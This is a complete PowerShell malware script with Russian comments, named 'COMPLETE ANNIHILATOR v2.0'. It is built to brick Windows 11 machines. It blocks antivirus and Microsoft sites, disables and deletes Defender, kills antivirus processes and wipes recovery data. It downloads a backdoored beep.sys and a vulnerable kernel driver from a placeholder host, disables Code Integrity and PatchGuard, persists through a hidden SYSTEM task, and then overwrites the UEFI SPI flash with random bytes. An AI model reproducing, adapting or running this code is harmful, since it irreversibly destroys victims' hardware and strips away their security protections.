# ╔══════════════════════════════════════════════════════════════╗
# ║                    COMPLETE ANNIHILATOR v2.0                 ║
# ║         Windows 11 24H2 Compatible | UEFI Killer             ║
# ╚══════════════════════════════════════════════════════════════╝

# ============================================
# МОДУЛЬ 0: ОПРЕДЕЛЕНИЕ ВЕРСИИ ОС
# ============================================
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
$build = [int](Get-ItemProperty -Path $regPath -Name "CurrentBuild" -ErrorAction SilentlyContinue).CurrentBuild
if (-not $build) { $build = [Environment]::OSVersion.Version.Build }

$major = [Environment]::OSVersion.Version.Major
$minor = [Environment]::OSVersion.Version.Minor
if ($build -ge 10240) { $major = 10 }

Write-Host "[INFO] OS: Major=$major, Minor=$minor, Build=$build" -ForegroundColor Cyan

# ============================================
# МОДУЛЬ 1: ПРОВЕРКА ПРАВ SYSTEM
# ============================================
$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
if ($CurrentUser -ne "NT AUTHORITY\SYSTEM" -and $CurrentUser -ne "УРОВЕНЬ СИСТЕМЫ") {
    [System.Windows.Forms.MessageBox]::Show("Требуются права SYSTEM!", "Ошибка", 0, 16)
    Exit 1
}
Write-Host "[INFO] Права SYSTEM подтверждены." -ForegroundColor Green

# ============================================
# МОДУЛЬ 1b: ОПРЕДЕЛЕНИЕ ЭТАПА
# ============================================
$MarkerPath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage2.ready"

if (Test-Path $MarkerPath) {
    $Stage = 2
    Write-Host "[STAGE] Обнаружен маркер. Запуск STAGE 2." -ForegroundColor Magenta
} else {
    $Stage = 1
    Write-Host "[STAGE] Маркер не найден. Запуск STAGE 1." -ForegroundColor Cyan
}

# ╔══════════════════════════════════════════════════════════════╗
# ║                         STAGE 1                              ║
# ║        Подготовка: защита отключена, драйвер подменён       ║
# ╚══════════════════════════════════════════════════════════════╝

if ($Stage -eq 1) {

    # ──────────────────────────────────────
    # БЛОКИРОВКА САЙТОВ
    # ──────────────────────────────────────
    $domainsToBlock = @(
        "kaspersky.com", "kaspersky.ru", "drweb.ru", "drweb.com",
        "eset.com", "malwarebytes.com", "virustotal.com",
        "microsoft.com", "support.microsoft.com", "update.microsoft.com"
    )
    $hostsPath = "$env:windir\System32\drivers\etc\hosts"

    Write-Host "[HOSTS] Блокировка сайтов..." -ForegroundColor Yellow
    if (Test-Path $hostsPath) {
        Copy-Item $hostsPath "$hostsPath.bak" -Force
        $currentHosts = Get-Content $hostsPath
        foreach ($domain in $domainsToBlock) {
            foreach ($entry in @($domain, "www.$domain")) {
                if (-not ($currentHosts -match [regex]::Escape($entry))) {
                    Add-Content -Path $hostsPath -Value "127.0.0.1    $entry"
                }
            }
        }
        ipconfig /flushdns
    }

    # ──────────────────────────────────────
    # ОТКЛЮЧЕНИЕ DEFENDER
    # ──────────────────────────────────────
    Write-Host "[DEFENDER] Отключение..." -ForegroundColor Yellow
    sc stop WinDefend 2>$null
    sc config WinDefend start= disabled 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f 2>$null

    # ──────────────────────────────────────
    # УБИЙСТВО АНТИВИРУСОВ (процессы)
    # ──────────────────────────────────────
    Write-Host "[AV] Зачистка процессов..." -ForegroundColor Yellow
    $AVProcesses = @(
        "avp", "avpui", "AvastSvc", "AvastUI", "egui", "ekrn",
        "dwengine", "mbam", "mbamtray", "mcshield", "nsbu",
        "360tray", "bdagent", "vsserv", "cmdagent"
    )
    foreach ($p in $AVProcesses) {
        Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force
    }
    Start-Sleep -Seconds 2

    # ──────────────────────────────────────
    # УДАЛЕНИЕ RECOVERY
    # ──────────────────────────────────────
    Write-Host "[RECOVERY] Удаление среды восстановления..." -ForegroundColor Yellow
    takeown /f "C:\Windows\System32\Recovery" /a /r 2>$null
    icacls "C:\Windows\System32\Recovery" /grant *S-1-5-32-544:F /c /t 2>$null
    rmdir /s /q "C:\Windows\System32\Recovery" 2>$null
    rmdir /s /q "C:\System Volume Information" 2>$null

    # ──────────────────────────────────────
    # ТВИКИ РЕЕСТРА
    # ──────────────────────────────────────
    Write-Host "[REGISTRY] Твики реестра..." -ForegroundColor Yellow
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v AlternateShell /t REG_SZ /d "cmd.exe" /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f 2>$null

    # ──────────────────────────────────────
    # ПРОПИСЫВАНИЕ ДРАЙВЕРА В SAFEBOOT
    # ──────────────────────────────────────
    Write-Host "[SAFEBOOT] Прописываю драйвер в безопасный режим..." -ForegroundColor Yellow
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\beep" /v Start /t REG_DWORD /d 0 /f 2>$null
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\beep" /ve /t REG_SZ /d "Driver" /f 2>$null
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\beep" /ve /t REG_SZ /d "Driver" /f 2>$null

    # ──────────────────────────────────────
    # ПОДМЕНА beep.sys
    # ──────────────────────────────────────
    Write-Host "[DRIVER] Подмена beep.sys..." -ForegroundColor Yellow
    
    $BeepPath    = "C:\Windows\System32\drivers\beep.sys"
    $BeepBackup  = "C:\Windows\System32\drivers\beep.sys.orig"
    $OurDriver   = "C:\Users\Public\Music\beep_backdoor.sys"
    $DriverUrl   = "https://твоя-ссылка.com/beep_backdoor.sys"

    if (-not (Test-Path $OurDriver)) {
        Write-Host "[DRIVER] Скачиваю драйвер..." -ForegroundColor Gray
        Invoke-WebRequest -Uri $DriverUrl -OutFile $OurDriver -UseBasicParsing
        attrib +h +s $OurDriver
    }

    if (-not (Test-Path $BeepBackup)) {
        Copy-Item $BeepPath $BeepBackup -Force
    }

    takeown /f "$BeepPath" /a 2>$null
    icacls "$BeepPath" /grant *S-1-5-32-544:F /c 2>$null
    icacls "$BeepPath" /grant *S-1-5-18:F /c 2>$null
    Copy-Item $OurDriver $BeepPath -Force

    # ──────────────────────────────────────
    # ОТКЛЮЧЕНИЕ ПРОВЕРКИ ПОДПИСИ (CI PATCH)
    # ──────────────────────────────────────
    Write-Host "[CI] Скачивание патчера Code Integrity..." -ForegroundColor Yellow
    $PatcherUrl  = "https://твоя-ссылка.com/ci_patcher.exe"
    $PatcherPath = "C:\Users\Public\Music\ci_patcher.exe"

    if (-not (Test-Path $PatcherPath)) {
        Invoke-WebRequest -Uri $PatcherUrl -OutFile $PatcherPath -UseBasicParsing
    }

    # Загружаем RTCore64 для доступа к памяти ядра
    $RTDriverPath = "C:\Users\Public\Music\rtcore64.sys"
    $RTDriverUrl  = "https://твоя-ссылка.com/rtcore64.sys"

    if (-not (Test-Path $RTDriverPath)) {
        Invoke-WebRequest -Uri $RTDriverUrl -OutFile $RTDriverPath -UseBasicParsing
    }

    sc stop RTCore64 2>$null
    sc delete RTCore64 2>$null
    Start-Sleep -Seconds 1
    sc create RTCore64 type= kernel start= demand binPath= "$RTDriverPath" 2>$null
    sc start RTCore64 2>$null

    Start-Sleep -Seconds 2

    # Запускаем патчер CI + PatchGuard
    & $PatcherPath --disable-ci --disable-pg

    Write-Host "[CI] Code Integrity и PatchGuard отключены." -ForegroundColor Green

    # ──────────────────────────────────────
    # УДАЛЕНИЕ MsMpEng.exe
    # ──────────────────────────────────────
    Write-Host "[DEFENDER] Удаление MsMpEng.exe..." -ForegroundColor Yellow
    Get-Process -Name MsMpEng -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Milliseconds 500
    $DefenderPath = "C:\ProgramData\Microsoft\Windows Defender\Platform"
    if (Test-Path $DefenderPath) {
        Get-ChildItem -Path $DefenderPath -Recurse -Filter "MsMpEng.exe" -ErrorAction SilentlyContinue | ForEach-Object {
            takeown /f "$($_.FullName)" /a 2>$null
            icacls "$($_.FullName)" /grant *S-1-5-32-544:F /c 2>$null
            Remove-Item -Path $_.FullName -Force
        }
    }

    # ──────────────────────────────────────
    # ПРОПИСЫВАНИЕ В АВТОЗАГРУЗКУ
    # ──────────────────────────────────────
    Write-Host "[PERSIST] Прописываю в автозагрузку..." -ForegroundColor Yellow
    $SelfPath = $MyInvocation.MyCommand.Path
    $TaskName = "SystemHostManager"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$SelfPath`""
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Trigger $trigger -Action $action -Principal $principal -Force 2>$null

    # ──────────────────────────────────────
    # МАРКЕР STAGE 2
    # ──────────────────────────────────────
    New-Item -Path $MarkerPath -Force -ItemType File 2>$null

    # ──────────────────────────────────────
    # ПЕРЕЗАГРУЗКА
    # ──────────────────────────────────────
    Write-Host "[STAGE 1] Завершён. Перезагрузка..." -ForegroundColor Green
    Start-Sleep -Seconds 3
    shutdown /r /f /t 0
    Exit
}

# ╔══════════════════════════════════════════════════════════════╗
# ║                         STAGE 2                              ║
# ║        Уничтожение UEFI через подменённый драйвер           ║
# ╚══════════════════════════════════════════════════════════════╝

if ($Stage -eq 2) {

    Write-Host "[STAGE 2] Ожидание загрузки драйвера..." -ForegroundColor Magenta
    Start-Sleep -Seconds 15

    # ──────────────────────────────────────
    # ОПРЕДЕЛЕНИЕ АДРЕСА SPI FLASH
    # ──────────────────────────────────────
    Write-Host "[SPI] Определение адреса SPI Flash..." -ForegroundColor Cyan
    
    $SPIToolPath = "C:\Users\Public\Music\spi_tool.exe"
    $SPIToolUrl  = "https://твоя-ссылка.com/spi_tool.exe"

    if (-not (Test-Path $SPIToolPath)) {
        Invoke-WebRequest -Uri $SPIToolUrl -OutFile $SPIToolPath -UseBasicParsing
    }

    # Авто-определение чипа и адреса
    $SPIInfo = & $SPIToolPath --detect 2>$null
    $SPIBase = 0xFF000000  # Значение по умолчанию
    $SPISize = 0x1000000   # 16 MB по умолчанию
    $SPIChip = "W25Q128"

    if ($SPIInfo -match "Base:\s*(0x[0-9A-Fa-f]+)") {
        $SPIBase = [uint64]$Matches[1]
    }
    if ($SPIInfo -match "Size:\s*(\d+)\s*MB") {
        $SPISize = [uint64]$Matches[1] * 1MB
    }
    if ($SPIInfo -match "Chip:\s*(\S+)") {
        $SPIChip = $Matches[1]
    }

    Write-Host "[SPI] Чип: $SPIChip, Адрес: 0x$($SPIBase.ToString('X16')), Размер: $($SPISize / 1MB) MB" -ForegroundColor Green

    # ──────────────────────────────────────
    # СНЯТИЕ BIOS LOCK
    # ──────────────────────────────────────
    Write-Host "[SPI] Снятие BIOS Lock..." -ForegroundColor Yellow

    $BiosCntl = & $SPIToolPath --read-pci --bus 0 --dev 31 --func 0 --offset 0xDC --width 1 2>$null
    if ($BiosCntl -match "Value:\s*(0x[0-9A-Fa-f]+)") {
        $BiosCntlValue = [byte]$Matches[1]
        
        if ($BiosCntlValue -band 0x02) {
            Write-Host "[SPI] BIOS Lock обнаружен. Снимаем..." -ForegroundColor Yellow
            $NewValue = ($BiosCntlValue -band 0xFC) -bor 0x01
            & $SPIToolPath --write-pci --bus 0 --dev 31 --func 0 --offset 0xDC --value $NewValue --width 1 2>$null
            Write-Host "[SPI] BIOS Lock снят." -ForegroundColor Green
        } else {
            Write-Host "[SPI] BIOS Lock уже снят." -ForegroundColor Green
        }
    }

    # ──────────────────────────────────────
    # СОЗДАНИЕ МУСОРА
    # ──────────────────────────────────────
    Write-Host "[SPI] Создание мусора ($($SPISize / 1MB) MB)..." -ForegroundColor Yellow
    
    $BrickPath = "C:\Users\Public\Music\brick.bin"
    $BrickData = New-Object byte[] $SPISize
    [System.Security.Cryptography.RandomNumberGenerator]::GetBytes($BrickData)
    [System.IO.File]::WriteAllBytes($BrickPath, $BrickData)

    # ──────────────────────────────────────
    # УНИЧТОЖЕНИЕ БАНКА A
    # ──────────────────────────────────────
    Write-Host "[SPI] УНИЧТОЖЕНИЕ БАНКА A (0x$($SPIBase.ToString('X16')))..." -ForegroundColor Red -BackgroundColor Black
    & $SPIToolPath --write --input $BrickPath --chip $SPIChip --offset 0 2>$null
    Write-Host "[SPI] Банк A уничтожен." -ForegroundColor Green

    # ──────────────────────────────────────
    # УНИЧТОЖЕНИЕ БАНКА B (если есть)
    # ──────────────────────────────────────
    Write-Host "[SPI] УНИЧТОЖЕНИЕ БАНКА B (0x$($($SPIBase + $SPISize).ToString('X16')))..." -ForegroundColor Red -BackgroundColor Black
    
    # Проверяем, есть ли второй банк (определяем по размеру чипа)
    # Если чип 32MB — значит есть два банка по 16MB
    if ($SPISize -ge 32MB) {
        & $SPIToolPath --write --input $BrickPath --chip $SPIChip --offset $SPISize 2>$null
        Write-Host "[SPI] Банк B уничтожен." -ForegroundColor Green
    } else {
        Write-Host "[SPI] Второй банк не обнаружен (чип $SPISize MB)." -ForegroundColor Yellow
    }

    # ──────────────────────────────────────
    # ОЧИСТКА
    # ──────────────────────────────────────
    Write-Host "[CLEANUP] Очистка следов..." -ForegroundColor Yellow
    Remove-Item $MarkerPath -Force -ErrorAction SilentlyContinue
    Remove-Item $BrickPath -Force -ErrorAction SilentlyContinue
    Remove-Item $SPIToolPath -Force -ErrorAction SilentlyContinue
    sc stop RTCore64 2>$null
    sc delete RTCore64 2>$null

    # ──────────────────────────────────────
    # ФИНАЛ
    # ──────────────────────────────────────
    Write-Host "`n╔══════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host   "║   UEFI УНИЧТОЖЕН. ПК ПРЕВРАЩЁН В КИРПИЧ. ║" -ForegroundColor Red
    Write-Host   "║   Восстановление: только программатор.    ║" -ForegroundColor Red
    Write-Host   "╚══════════════════════════════════════════╝`n" -ForegroundColor Red
    
    Start-Sleep -Seconds 3
    shutdown /r /f /t 0
}
